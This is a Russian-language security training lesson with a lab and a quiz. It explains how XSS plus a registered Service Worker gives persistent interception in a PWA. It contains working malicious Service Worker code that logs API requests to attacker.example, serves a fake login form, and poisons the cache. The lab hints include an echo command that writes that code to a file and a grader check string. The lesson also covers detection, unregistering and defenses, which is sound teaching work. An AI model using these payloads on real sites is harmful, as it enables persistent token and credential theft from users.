---
id: web-service-worker
title: "Service Worker и атаки на PWA"
category: web
parent: web-browser-advanced
difficulty: medium
order: 2
tags: [service-worker, pwa, xss, persistent, cache, client-side]
prerequisites: [web-xss, web-same-origin-cors]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 36
summary: "Как Service Worker превращает разовую XSS в постоянный перехват трафика и как это эксплуатировать."
lab:
  kind: shell
  title: "Практика: Service Worker перехватывает трафик"
  toolset: [core, curl]
  workdir: /home/student/task
  files: [task.md]
  check: "grep -q 'addEventListener' evil-sw.js && grep -q 'nto{' found.txt"
  hints:
    - "На app.example есть XSS. Зарегистрированный SW живёт после закрытия вкладки."
    - "Напиши evil-sw.js с обработчиком fetch, который логирует запросы к /api/ на attacker.example."
    - "echo 'self.addEventListener(\"fetch\", e => { if (e.request.url.includes(\"/api/\")) fetch(\"https://attacker.example/log?u=\"+e.request.url) })' > evil-sw.js"
    - "Теперь забери лог атакующего: curl -s https://attacker.example/log > found.txt"

---

## Вопрос, с которого всё начинается

Ты нашёл XSS на `app.example`. Обычно это «разовая» победа: выполнил `alert(1)`, но как только вкладку закрыли или уязвимость исправили — всё закончилось.

А что если сделать XSS **постоянной**? Для этого есть механизм **Service Worker** — фоновый скрипт, который браузер регистрирует для origin и который может **перехватывать все сетевые запросы** страницы. Если через XSS зарегистрировать свой SW, он продолжит работать даже после закрытия вкладки. Сегодня разберём, как разовая инъекция превращается в устойчивый компромисс.

## Наш пример: найденная XSS

У нас есть подтверждённая XSS на `app.example` — например, в поле комментария, которое отражается без экранирования. Вместо безобидного `alert(1)` выполним JavaScript, который регистрирует Service Worker:

```js
navigator.serviceWorker.register('/uploads/evil-sw.js', {scope: '/'});
```

`register(script, {scope})` — регистрация SW. `scope: '/'` означает, что скрипт будет контролировать **весь** origin. Скрипт `evil-sw.js` нам нужно предварительно разместить там, где он достижим (например, через загрузку файла, см. «Если не сработало»).

## Шаг 1: что такое Service Worker

Ключевые свойства SW, которые делают его опасным:

| Свойство | Значение |
|----------|----------|
| Scope | обычно `/` — весь origin |
| Жизненный цикл | install → activate → fetch |
| Персистентность | живёт после закрытия вкладки |
| Хранилище | Cache Storage + IndexedDB |
| Требование | HTTPS (или localhost) |
| Управление | `navigator.serviceWorker.register(script, {scope})` |

**Scope** определяется директорией скрипта: `/sw.js` даёт scope `/`, а `/app/sw.js` — только `/app/`. Заголовок `Service-Worker-Allowed: /` позволяет расширить scope. И главное: SW работает только в **secure context** (HTTPS или localhost).

## Шаг 2: перехват fetch — кража токенов

Внутри SW обработчик события `fetch` видит **каждый** запрос страницы и может его подменить. Вот наш `evil-sw.js`:

```js
self.addEventListener('fetch', (e) => {
  const u = new URL(e.request.url);
  if (u.pathname.startsWith('/api/')) {
    fetch('https://attacker.example/log?u=' + encodeURIComponent(e.request.url));
  }
});
```

После перезагрузки страницы SW начинает контролировать origin, и все запросы к `/api/` логируются на сервер атакующего. Так утекают токены из заголовков и URL. Артефакт — запросы жертвы в твоём логе.

## Шаг 3: подмена ответа

SW может не только наблюдать, но и **отвечать** вместо сети. Это позволяет подменить, например, страницу логина и украсть учётные данные без изменения сервера:

```js
self.addEventListener('fetch', (e) => {
  if (e.request.url.endsWith('/login')) {
    e.respondWith(new Response(
      '<form action="https://attacker.example/">...</form>',
      {headers: {'Content-Type': 'text/html'}}
    ));
  }
});
```

`respondWith(...)` подменяет ответ на любой путь. Получается «постоянный» фишинг **внутри** origin: адрес настоящий, а форма — фальшивая. Так же можно подменить API-ответ и обойти клиентскую логику.

## Шаг 4: почему это персистентно

SW — единственный веб-механизм, который **переживает** закрытие вкладки и очистку JS-контекста. Он регистрируется один раз и продолжает работать. Более того, он может закэшировать поддельные ответы в **Cache Storage**, и тогда подделка сохранится даже после исправления на сервере:

```js
self.addEventListener('fetch', (e) => {
  if (e.request.url.endsWith('/app.js')) {
    e.respondWith(
      caches.open('poison').then(c => c.put('/app.js',
        new Response('/* malicious */', {headers:{'Content-Type':'application/javascript'}})))
      .then(() => caches.match('/app.js'))
    );
  }
});
```

Именно поэтому XSS с регистрацией SW повышает severity до **persistent**: одного визита достаточно, чтобы закрепиться в браузере жертвы надолго.

## Шаг 5: векторы внедрения

| Вектор | Как работает |
|--------|--------------|
| Stored XSS | зарегистрировать SW со scope `/` |
| `importScripts` | легитимный SW подгружает чужой код (`importScripts('//attacker/sw.js')`) |
| Подмена SW-скрипта | если `/sw.js` отдаётся с user-content |
| Открытый редирект | SW-скрипт с чужого домена через редирект |
| `Service-Worker-Allowed: /` | расширяет scope, давая XSS в подкаталоге контроль над всем сайтом |

Заголовок `Service-Worker-Allowed` стоит проверять отдельно:

```bash
$ curl -sI https://app.example/js/sw.js | grep -i 'service-worker-allowed'
Service-Worker-Allowed: /
```

Если `/js/sw.js` отдаётся с этим заголовком, любой XSS в `/js/` получает SW на весь origin.

## Если не сработало

- Кросс-origin SW не регистрируется без `Service-Worker-Allowed` — размести скрипт на том же origin (через загрузку файла, JSONP или user-content).
- CSP с `worker-src` может блокировать регистрацию — проверь политику.
- SW не активен сразу — он управляет страницей после перезагрузки или после `clients.claim()`.
- Старый SW не обновляется мгновенно: он живёт до активации нового — это играет на руку атакующему.
- Для очистки (при тесте/защите): `navigator.serviceWorker.getRegistrations().then(rs => rs.forEach(r => r.unregister()))`.

## Как проверять и чем защищаться

Начать стоит с инвентаризации уже зарегистрированных SW — они видны в DevTools (Application → Service Workers) или из консоли:

```js
navigator.serviceWorker.getRegistrations().then(rs => console.log(rs));
```

Затем проверь сам скрипт и его scope:

```bash
$ curl -s -I https://app.example/sw.js | grep -iE 'content-type|service-worker-allowed'
content-type: application/javascript
```

А также — может ли SW-скрипт подтянуть чужой код через `importScripts`, и не отдаётся ли `sw.js` с пользовательским содержимым.

Защита и типичные обходы:

| Защита | Обход |
|--------|-------|
| SW-скрипт с `Content-Type: application/javascript` | внедрение через user-content с правильным типом |
| Ограничение scope директорией | XSS в нужной директории / `Service-Worker-Allowed` |
| `importScripts` с same-origin | редирект или JSONP-подгрузка |
| CSP `worker-src` | если не задан — регистрация проходит с любого разрешённого источника |
| Проверка обновлений | старый SW живёт до активации нового |

## Что мы теперь знаем

- Service Worker — фоновый скрипт, перехватывающий запросы origin.
- Scope определяется директорией скрипта; `Service-Worker-Allowed` его расширяет.
- Обработчик `fetch` читает и подменяет запросы (кража токенов, подмена ответов).
- SW переживает закрытие вкладки, а Cache Storage — даже фикс на сервере.
- XSS с регистрацией SW становится **постоянным** компромиссом.
- Векторы: stored XSS, `importScripts`, user-content как `sw.js`, редирект.

## На что смотреть дальше

- Не считай XSS разовой: проверь, можно ли через неё зарегистрировать SW.
- Проверяй заголовки SW-скриптов и `Service-Worker-Allowed`.
- Смотри CSP на `worker-src`: его отсутствие упрощает регистрацию.
- Помни про `importScripts`: легитимный SW может подтянуть чужой код.
- Для отчёта покажи персистентность: перехват работает **после** закрытия вкладки.
- Помни про Cache Storage: поддельные ответы могут пережить даже исправление на сервере.
- Проверяй `importScripts` в легитимном SW — так чужой код попадает в доверенный скрипт без XSS.
- Если сайт отдаёт `Service-Worker-Allowed: /`, SW из поддиректории управляет **всем** origin — это стоит проверить первым делом.
- При реагировании на инцидент недостаточно починить сервер: нужно ещё отозвать SW у клиентов (например, через `registration.unregister()`), иначе браузеры продолжат отдавать поддельные ответы из кеша.

## Квиз

Проверь себя.

```quiz
- question: "Почему Service Worker делает XSS персистентной?"
  options:
    - "Он живёт после закрытия вкладки и перехватывает запросы origin"
    - "Он шифрует cookies"
    - "Он меняет DNS"
    - "Он работает только в HTTPS"
  answer: 0
  explanation: "SW регистрируется на origin и перехватывает fetch-события."
- question: "Чем определяется scope Service Worker?"
  options:
    - "Директорией скрипта (и заголовком `Service-Worker-Allowed`)"
    - "Cookie"
    - "Портом"
    - "User-Agent"
  answer: 0
  explanation: "`/sw.js` → scope `/`; заголовок может расширить scope."
- question: "Какое событие позволяет SW читать/менять запросы?"
  options:
    - "`fetch`"
    - "`click`"
    - "`load`"
    - "`message`"
  answer: 0
  explanation: "Обработчик `fetch` может вызывать `respondWith`."
- question: "Что нужно для регистрации SW?"
  options:
    - "Secure context (HTTPS или localhost)"
    - "Только HTTP"
    - "FTP"
    - "SMTP"
  answer: 0
  explanation: "SW требует secure context."
- question: "Как очистить SW при защите/тесте?"
  options:
    - "`navigator.serviceWorker.getRegistrations().then(rs=>rs.forEach(r=>r.unregister()))`"
    - "Очистить cookie"
    - "Сменить пароль"
    - "Перезагрузить DNS"
  answer: 0
  explanation: "Регистрации снимаются через `unregister()`."
```

## Куда дальше

В следующем уроке мы разберём **DOM clobbering** (`web-dom-clobbering`): как HTML-элементы с определёнными `id`/`name` подменяют JavaScript-переменные. А пока главное запомни: если есть XSS и возможность зарегистрировать Service Worker — вредоносный код становится постоянным и переживает исправление уязвимости.

## Где пригодится

- **CTF (Web):** задачи, где XSS нужно «закрепить» или перехватить запросы.
- **Bug bounty:** XSS с регистрацией SW — повышение severity до persistent.
- **Пентест:** аудит PWA, scope SW, `Service-Worker-Allowed`.
- **Работа (AppSec/Dev):** контроль scope SW, CSP для `worker-src`, очистка при инцидентах.
